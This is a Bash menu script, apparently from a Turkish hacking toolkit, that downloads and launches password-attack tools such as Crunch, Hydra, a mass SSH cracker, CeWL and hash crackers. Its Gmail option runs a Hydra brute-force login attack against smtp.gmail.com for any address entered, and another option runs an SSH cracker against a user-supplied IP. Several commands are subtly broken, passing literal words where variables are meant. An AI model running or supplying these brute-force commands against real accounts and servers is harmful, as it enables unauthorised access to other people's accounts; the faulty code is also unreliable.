#!/bin/bash

banner() {
clear
printf "\n"
printf "\n"
printf "\e[1;77m ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▌ ▐ ▄▌      ▄▄▄  ·▄▄▄▄       ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄ .▄▄ · \e[0m\n"
printf "\e[1;77m▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ██· █▌▐█▪     ▀▄ █·██▪ ██     ▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪▐█ ▀. \e[0m\n"
printf "\e[1;77m ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐█· ▐█▌    ▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·▄▀▀▀█▄\e[0m\n"
printf "\e[1;77m▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█▌██▐█▌▐█▌.▐▌▐█•█▌██. ██     ▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌▐█▄▪▐█\e[0m\n"
printf "\e[1;77m.▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀▀▀▀▀▀•      ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀▀ \e[0m\n"
printf "\n"
printf "\e[1;93m       .:\e[0m\e[1;77m Cyber Security Tool coded by:  𝑪 𝒆 𝒚 𝒔 \e[0m\e[1;93m:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m::   Parola Kırma Atakları Araçlarının Bulunduğu kısımdır!         ::\e[0m\n"
printf "  \e[101m\e[1;77m::    Geliştirici herhangi bir zarardan sorumlu değildir!          ::\e[0m\n"
printf "\n" 
printf "\n" 

}

menu(){ # Ana Menü Görünümü ve Seçenekler
printf " \e[101m\e[1;77m														\e[0m\n"
printf "\e[	1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m 	GERİ(Bir Önceki Menüye Döner) \n"
printf "\e[	1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m 	Crunch \n"
printf "\e[	1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m 	Hydra \n"
printf "\e[	1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m 	SSH Crack \n"
printf "\e[	1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m 	Mail Services Account Cracks \n"
printf "\e[	1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m 	FindMyHash \n"
printf "\e[	1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m 	CeWL \n"
printf "\e[	1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m 	Johnny \n"
printf "\e[	1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m 	Hash-Identifier \n"
printf "\e[	1;92m[\e[0m\e[1;77mB \e[0m\e[1;92m]\e[0m\e[1;93m 	Araçlar hakkında bilgi alma  \n"
printf "\e[	1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m 	ÇIKIŞ \n"
printf " \e[101m\e[1;77m														\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir Seçenek Seçiniz! \e[0m\en' option

#seçimler

if [[ $option == 99 ]]; then

exit 1

#geri
elif [[ $option == 0 || $option == 00 ]]; then
cd $HOME/cyberhunter/
clear
bash cyberhunter.sh

#Crunch
elif [[ $option == 1 || $option == 01 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/crunchsec/crunch
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
cd $HOME/cyberhunter/pages/07password_attacks/crunch
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Min karakter giriniz!\e[0m\en \n' min
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Max karakter giriniz!\e[0m\en \n' max
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Şifre Karakerleri giriniz! (Örn: kali) giriniz!\e[0m\en \n' kelime
gcc -c crunch.c
gcc crunch.o -o crunch
crunch min max kelime > /root/Masaüstü/wordlist.txt

#hydra
elif [[ $option == 2 || $option == 02 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/vanhauser-thc/thc-hydra
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
xhydra
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"

#sshcrack
elif [[ $option == 3 || $option == 03 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/Flokyofficial/MASS-SSH-CRACKER
cd $HOME/cyberhunter/pages/07password_attacks/MASS-SSH-CRACKER
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] IP Giriniz!\e[0m\en \n' ip
php run.php ip

#Mail Services Account Cracks
elif [[ $option == 4 || $option == 04 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
printf "\e[1;93m [!] İşlemler Hydra Aracı ile gerçekleştiriliyor... \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] gmail adresi Giriniz!\e[0m\en \n' mail
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] wordlist yolu veriniz! (Örn: /root/Masaüstü/word.txt )\e[0m\en \n' wordlist
hydra -s 465 -S -v -V -l mail -P wordlist -e ns -t 16 smtp.gmail.com smtp

#findmyhash
elif [[ $option == 5 || $option == 05 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/Talanor/findmyhash
cd $HOME/cyberhunter/pages/07password_attacks/findmyhash
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hash Türünü Giriniz!\e[0m\en \n' hashturu
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hashı Giriniz! \e[0m\en \n' hash1
python3 hash-tool.py hashturu -h hash1

#cewl
elif [[ $option == 6 || $option == 06 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/digininja/CeWL
cd $HOME/cyberhunter/pages/07password_attacks/CeWL
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
ruby cewl.rb -h

#johnny
elif [[ $option == 7 || $option == 07 ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
johnny

#hash-identifier
elif [[ $option == 8 || $option == 08 ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
git clone https://github.com/blackploit/hash-identifier
cd $HOME/cyberhunter/pages/07password_attacks/hash-identifier
printf "\e[1;93m [!] Kurulum Tamamlandı... \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Araç Çalıştırılıyor... \e[0m\en \n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hashı Giriniz! \e[0m\en \n' hash1
python3 hash-id.py hash1

#bilgi
elif [[ $option == 'b' || $option == 'B' ]]; then
cd $HOME/cyberhunter/pages/07password_attacks
gedit bilgi
clear

else 
printf "\e[1;93m [!] Yanlış bir seçenek seçtiniz. Lütfen tekrar deneyiniz! \e[0m\n"

sleep 1
clear
banner
menu
fi

}
banner
menu

